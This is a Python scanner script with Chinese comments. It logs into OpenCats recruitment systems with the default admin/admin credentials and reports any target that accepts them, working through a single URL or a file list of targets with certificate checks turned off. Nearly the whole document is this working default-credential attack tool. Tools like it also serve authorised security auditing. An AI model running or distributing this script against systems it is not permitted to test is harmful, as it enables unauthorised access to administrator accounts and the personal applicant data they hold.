#!/usr/bin/env python
# -*- conding:utf-8 -*-
# OpenCats 默认账户密码
#  admin/admin（cats）

from pyparsing import col
import requests
import argparse
import sys
import urllib3
import threading
from termcolor import cprint
urllib3.disable_warnings()
color = "green"

def title():
    cprint("""
  ____                        _____         _        
 / __ \                      / ____|       | |       
| |  | | _ __    ___  _ __  | |       __ _ | |_  ___ 
| |  | || '_ \  / _ \| '_ \ | |      / _` || __|/ __|
| |__| || |_) ||  __/| | | || |____ | (_| || |_ \__ \
 \____/ | .__/  \___||_| |_| \_____| \__,_| \__||___/
        | |                                          
        |_|                                          

                                                                                                                                                                                                         
                                                 Author:Henry4E36
               """,color)


class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file
    

    def target_url(self):
        color = "red"
        payload = self.url + "/index.php?m=login&a=attemptLogin"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = "username=admin&password=admin" 
        try:
            res = requests.post(url=payload, headers=headers, data=data,verify=False, timeout=5, allow_redirects=False)
            if res.status_code == 302 and f"{self.url}/index.php?m=home" == res.headers["Location"]:
                cprint(f"[{chr(8730)}] 目标系统: {self.url} 存在默认账号密码!" ,color)
            else:               
                cprint(f"[x] 目标系统: {self.url} 不存在默认密码!")
        except Exception as e:
            print(f"[x] 目标系统: {self.url} 连接错误！")


    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description='OpenCats 默认密码')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 default.py -u http://127.0.0.1\neg2:>>>python3 default.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()